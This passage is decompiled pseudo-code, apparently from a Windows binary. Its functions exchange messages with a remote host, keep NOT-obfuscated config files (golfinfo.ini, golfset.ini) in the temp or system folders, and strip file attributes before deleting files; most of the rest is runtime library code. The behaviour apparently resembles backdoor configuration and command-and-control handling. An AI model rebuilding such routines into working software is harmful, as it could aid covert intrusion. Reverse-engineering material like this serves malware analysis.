  GetModuleFileNameW((HMODULE)0x0,local_210,0x104);
  pwVar1 = _wcsrchr(local_210,L'\\');
  *pwVar1 = L'\0';
  _wcscpy_s(unaff_EDI,0x104,local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_0040841e(char *param_1,u_short param_2)

{
  int iVar1;
  uint uVar2;
  wchar_t *_Src;
  SOCKET local_c24;
  int local_c20;
  undefined4 local_c1c;
  void *local_c18;
  uint local_c14;
  char *local_c10;
  undefined local_c0c [1024];
  wchar_t local_80c;
  undefined local_80a [2050];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_c10 = param_1;
  local_c1c = 0;
  _memcpy(local_c0c,&DAT_00425548,0x200);
  local_c18 = _malloc(0x10000);
  _memset(local_c18,0,0x10000);
  local_80c = L'\0';
  local_c20 = 0x10000;
  _memset(local_80a,0,0x7fe);
  local_c24 = 0;
  local_c14 = 0;
  iVar1 = FUN_00404808(&local_80c,local_c10,param_2);
  if (iVar1 == 0) {
    local_c1c = 1;
  }
  else {
    iVar1 = FUN_00404a3a(&local_c24,&local_80c,0xbb9,local_c0c,0x200);
    if (iVar1 == 0) {
      local_c1c = 3;
    }
    else {
      if (local_c18 == (void *)0x0) goto LAB_00408636;
      iVar1 = FUN_00404d4d(&local_c24,&local_80c,(undefined2 *)&local_c14,local_c18);
      if (((iVar1 == 0) || ((short)local_c14 != 0xbb9)) || (local_c20 == 0)) {
        local_c1c = 2;
      }
      else {
        _memset(&DAT_00424700,0,0x578);
        local_c14 = 0;
        local_c10 = (char *)0x0;
        if (0x117 < local_c20) {
          uVar2 = 0;
          do {
            _Src = (wchar_t *)(uVar2 + (int)local_c18);
            if ((*_Src != L'\0') && ((ushort)local_c10 < 5)) {
              uVar2 = (uint)local_c10 & 0xffff;
              _wcscpy_s(&DAT_00424700 + uVar2 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_00424804 + uVar2 * 0x118,0x14,_Src + 0x82,0x14);
              local_c10 = local_c10 + 1;
              (&DAT_00424800)[uVar2 * 0x46] = *(undefined4 *)(_Src + 0x80);
            }
            local_c14 = local_c14 + 0x118;
            uVar2 = local_c14 & 0xffff;
          } while ((int)(uVar2 + 0x118) <= local_c20);
        }
      }
    }
  }
  if (local_c18 != (void *)0x0) {
    _free(local_c18);
  }
LAB_00408636:
  FUN_00404996();
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_00408656(void *this,char *param_1,u_short param_2)

{
  int iVar1;
  char *_Dst;
  int iVar2;
  undefined *_Src;
  size_t _Size;
  SOCKET local_e1c;
  FILE *local_e18;
  wchar_t local_e14;
  undefined local_e12 [2046];
  wchar_t local_614;
  undefined auStack_612 [1022];
  wchar_t local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  _memset(&local_614,0,0x400);
  _wcscpy_s(&local_614,0x1ff,(wchar_t *)this);
  _Size = 0x200;
  _Src = &DAT_00425548;
  iVar1 = FUN_00409dc5((short *)this);
  _memcpy(auStack_612 + iVar1 * 2,_Src,_Size);
  iVar1 = FUN_00409dc5((short *)this);
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_e14 = L'\0';
  _memset(local_e12,0,0x7fe);
  local_214 = L'\0';
  local_e1c = 0;
  local_e18 = (FILE *)0x0;
  _memset(local_212,0,0x206);
  FUN_004083c4();
  _wcscat_s(&local_214,0x103,(wchar_t *)&DAT_0041dc88);
  iVar2 = FUN_00404808(&local_e14,param_1,param_2);
  if ((((iVar2 != 0) &&
       (iVar1 = FUN_00404a3a(&local_e1c,&local_e14,0xbba,&local_614,iVar1 * 2 + 0x202), iVar1 != 0))
      && (iVar1 = FUN_00404d4d(&local_e1c,&local_e14,(undefined2 *)&local_e18,_Dst), iVar1 != 0)) &&
     (((short)local_e18 == 0xbba && (*_Dst == '\0')))) {
    _wcscat_s(&local_214,0x104,(wchar_t *)&DAT_00425340);
    local_e18 = (FILE *)0x0;
    _DAT_004246fc = 0;
    __wfopen_s(&local_e18,&local_214,(wchar_t *)&DAT_0041dd1c);
    if (local_e18 != (FILE *)0x0) {
      FUN_00404ee0(&local_e18);
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  FUN_00404996();
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040888c(void)

{
  int iVar1;
  void *unaff_EDI;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [122];
  undefined local_194 [396];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_194;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (unaff_EDI != (void *)0x0) {
    local_214 = (FILE *)0x0;
    iVar1 = FUN_00409dc5(&DAT_0041de30);
    if (iVar1 == 0) {
      GetTempPathW(0x104,&local_210);
      _wcscat_s(&local_210,0x104,u_golfinfo_ini_0041fffc);
      __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041dd1c);
    }
    else {
      __wfopen_s(&local_214,&DAT_0041de30,(wchar_t *)&DAT_0041dd1c);
    }
    if (local_214 != (FILE *)0x0) {
      _fwrite(unaff_EDI,0x200,1,local_214);
      _fclose(local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_194);
  return;
}



void FUN_0040895c(void)

{
  int iVar1;
  void *unaff_EBX;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [118];
  undefined local_198 [400];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_198;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if ((unaff_EBX != (void *)0x0) && (iVar1 = FUN_00409dc5(u_golfset_ini_0041dd3c), iVar1 != 0)) {
    if (DAT_00423040 == 3) {
      GetSystemDirectoryW(&local_210,0x104);
      _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041dc88);
    }
    else {
      GetTempPathW(0x104,&local_210);
    }
    _wcscat_s(&local_210,0x104,u_golfset_ini_0041dd3c);
    __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041dd14);
    if (local_214 != (FILE *)0x0) {
      _fread(unaff_EBX,0x200,1,local_214);
      _fclose(local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_198);
  return;
}



void FUN_00408a46(void)

{
  int iVar1;
  void *unaff_EBX;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [118];
  undefined local_198 [400];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_198;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if ((unaff_EBX != (void *)0x0) && (iVar1 = FUN_00409dc5(u_golfinfo_ini_0041fffc), iVar1 != 0)) {
    GetTempPathW(0x104,&local_210);
    _wcscat_s(&local_210,0x104,u_golfinfo_ini_0041fffc);
    __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041dd14);
    if (local_214 != (FILE *)0x0) {
      _fread(unaff_EBX,0x200,1,local_214);
      _fclose(local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_198);
  return;
}



void __cdecl FUN_00408b07(int param_1)

{
  int iVar1;
  uint uVar2;
  void *unaff_EDI;
  int local_210 [129];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (unaff_EDI != (void *)0x0) {
    _memset(local_210,0,0x200);
    if (param_1 == 0) {
      iVar1 = FUN_0040895c();
    }
    else {
      iVar1 = FUN_00408a46();
    }
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_210 + uVar2) = ~*(byte *)((int)local_210 + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_210[0] == 0x504d534d) {
        _memmove(unaff_EDI,local_210,0x200);
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00408b93(int *param_1)

{
  uint uVar1;
  byte local_210 [516];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if ((param_1 != (int *)0x0) && (*param_1 == 0x504d534d)) {
    _memmove(local_210,param_1,0x200);
    uVar1 = 0;
    do {
      local_210[uVar1] = ~local_210[uVar1];
      uVar1 = uVar1 + 1;
    } while (uVar1 < 0x200);
    FUN_0040888c();
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



bool __cdecl FUN_00408bfe(LPCWSTR param_1,LPCVOID param_2,DWORD param_3)

{
  DWORD DVar1;
  BOOL BVar2;
  HANDLE hFile;
  bool bVar3;
  
  bVar3 = false;
  DVar1 = GetFileAttributesW(param_1);
  if (((DVar1 == 0xffffffff) || (BVar2 = FUN_00408c69(), BVar2 != 0)) &&
     (hFile = CreateFileW(param_1,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0),
     hFile != (HANDLE)0xffffffff)) {
    BVar2 = WriteFile(hFile,param_2,param_3,(LPDWORD)&param_2,(LPOVERLAPPED)0x0);
    bVar3 = (-(uint)(BVar2 != 0) & (uint)param_2) == param_3;
    CloseHandle(hFile);
  }
  return bVar3;
}



BOOL FUN_00408c69(void)

{
  LPCWSTR in_EAX;
  DWORD dwFileAttributes;
  BOOL BVar1;
  
  dwFileAttributes = GetFileAttributesW(in_EAX);
  if (dwFileAttributes == 0xffffffff) {
    return 0;
  }
  if ((dwFileAttributes & 1) != 0) {
    dwFileAttributes = dwFileAttributes ^ 1;
  }
  if ((dwFileAttributes & 4) != 0) {
    dwFileAttributes = dwFileAttributes ^ 4;
  }
  if ((dwFileAttributes & 2) != 0) {
    dwFileAttributes = dwFileAttributes ^ 2;
  }
  if ((dwFileAttributes & 0x20) != 0) {
    dwFileAttributes = dwFileAttributes ^ 0x20;
  }
  SetFileAttributesW(in_EAX,dwFileAttributes);
  BVar1 = DeleteFileW(in_EAX);
  GetLastError();
  return BVar1;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x00408cb4. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00422044) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_004268c4 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// Library Function - Single Match
//  _wcscat
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcscat(wchar_t *_Dest,wchar_t *_Source)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Dest;
  wVar1 = *_Dest;
  while (wVar1 != L'\0') {
    _Dest = _Dest + 1;
    wVar1 = *_Dest;
  }
  do {
    wVar1 = *_Source;
    *_Dest = wVar1;
    _Dest = _Dest + 1;
    _Source = _Source + 1;
  } while (wVar1 != L'\0');
  return pwVar2;
}



// Library Function - Single Match
//  _wcscpy
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcscpy(wchar_t *_Dest,wchar_t *_Source)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Dest;
  do {
    wVar1 = *_Source;
    *pwVar2 = wVar1;
    pwVar2 = pwVar2 + 1;
    _Source = _Source + 1;
  } while (wVar1 != L'\0');
  return _Dest;
}



// Library Function - Single Match
//  _wcscmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcscmp(wchar_t *_Str1,wchar_t *_Str2)

{
  int iVar1;
  
  while( true ) {
    iVar1 = (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
    if ((iVar1 != 0) || (*_Str2 == L'\0')) break;
    _Str1 = _Str1 + 1;
    _Str2 = _Str2 + 1;
  }
  if (iVar1 < 0) {
    return -1;
  }
  if (0 < iVar1) {
    iVar1 = 1;
  }
  return iVar1;
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_00408e1c;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00408e1c:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



void __cdecl FUN_00408e77(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00409093_caseD_2;
        case 3:
          goto switchD_00409093_caseD_3;
        }
        goto switchD_00409093_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00409093_caseD_0;
      case 1:
        goto switchD_00409093_caseD_1;
      case 2:
        goto switchD_00409093_caseD_2;
      case 3:
        goto switchD_00409093_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409093_caseD_2;
            case 3:
              goto switchD_00409093_caseD_3;
            }
            goto switchD_00409093_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409093_caseD_2;
            case 3:
              goto switchD_00409093_caseD_3;
            }
            goto switchD_00409093_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409093_caseD_2;
            case 3:
              goto switchD_00409093_caseD_3;
            }
            goto switchD_00409093_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00409093_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00409093_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00409093_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00409093_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_004268c4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_00408f0c_caseD_2;
      case 3:
        goto switchD_00408f0c_caseD_3;
      }
      goto switchD_00408f0c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_00408f0c_caseD_0;
    case 1:
      goto switchD_00408f0c_caseD_1;
    case 2:
      goto switchD_00408f0c_caseD_2;
    case 3:
      goto switchD_00408f0c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00408f0c_caseD_2;
          case 3:
            goto switchD_00408f0c_caseD_3;
          }
          goto switchD_00408f0c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00408f0c_caseD_2;
          case 3:
            goto switchD_00408f0c_caseD_3;
          }
          goto switchD_00408f0c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00408f0c_caseD_2;
          case 3:
            goto switchD_00408f0c_caseD_3;
          }
          goto switchD_00408f0c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_00408f0c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_00408f0c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00408f0c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_00408f0c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00409237;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00409237:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x004092ac:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x004092ac;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004202c0;
  uStack_c = 0x4092f1;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
